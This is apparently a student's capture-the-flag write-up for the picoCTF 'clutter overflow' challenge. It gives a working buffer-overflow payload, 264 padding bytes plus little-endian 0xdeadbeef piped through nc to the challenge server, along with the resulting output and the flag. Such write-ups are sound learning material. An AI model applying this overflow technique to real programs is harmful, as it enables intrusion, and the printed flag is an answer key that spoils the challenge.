# 3. clutter overflow

> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:

- The challenge gave no information to begin with, other than `clutter`. So I just started off by downloading the C file of the program attatched and read it
- While reading this C code, I saw the use of gets() function which I know is susceptible to buffer overflow, considering the challenge name, I now had a rough idea as to what I had to do
- Even so I ran the rpogram once to see what exactly I needed, The error message told me that 'code' should be '0xdeadbeef'
- Since I know a little about buffer overflow I knew if I overflowed the clutter variable(The variable which accepted input using gets()), it would eventually overflow into code
- To overflow it I first checked the size of clutter which was 256, So I put 256 garbage value followed by the a `z` to confirm it was overflowing
- Unfortunately it did not overflow, So I began incrementing the garbage value size by 4 and found that it began overflowing when there were 264 garbage values
- The last task was writing 0xdeadbeef into code, I did this by entering the values in little endian in form of `\xef\xbe\xad\xde`
- One last problem I faced was inputing strings directly, which did not return an output for some reason. To solve this, I tried using `echo` to pipe the string directly into nc mars.picoctf.net 31890 which worked and returned the flag
<img width="756" height="742" alt="image" src="https://github.com/user-attachments/assets/2a7d6887-029c-439f-99e9-4dc9f3f068ff" />

(The SIZE held the value of 256, specifically 0x100 which I converted)
```
root@DESKTOP-AFFIDQC:/mnt/c/users/Sohan/OneDrive/Desktop/Cryptonite/PicoCTF/HardWare# nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\xef\xbe\xad\xde
root@DESKTOP-AFFIDQC:/mnt/c/users/Sohan/OneDrive/Desktop/Cryptonite/PicoCTF/HardWare# echo 'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\xef\xbe\xad\xde' | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- This question was all about buffer overflow which I had already learnt a little about in a previous challenge but this question helped me understand more about buffer overflowing
- I learned about the format specifier %11x which takes in hex values
- While researching, I also found that deadbeef is actually used as a placeholder value, Although I did not read up much on this

## Notes:

- An other way could be to use program scripts to overflow the cluuter variable automatically and place the value deadbeef into code
- Another important note is that I do not understand why I got no output when I entered the string directly and why it only worked when I piped the stdout of echo into the connection
## Resources:

- https://www.geeksforgeeks.org/c/signals-c-language/
- https://www.geeksforgeeks.org/c/format-specifiers-in-c/
- https://www.youtube.com/watch?v=giv0DQDSsjQ
- https://0xrick.github.io/lists/stego/#steganography
- https://www.google.com

## Incorrect Tangents:
- The first error I made was, entering the string directly which did not give any output for some reason
- I also struggled with putting deadbeef into code, I first tried simply writing deadbeef but that did not work, I then saw the value of code and realized it was inverted so I then tried feebdaed but that did not convert into letters and rather its byte value
- At the end I learnt that you had to use its byte form to enter the correct value, So I tried `/xde/xad/xbe/xef` But that gave the answer in reverse, so I settled for the little endian style of writing the code which gave me the answer 

***
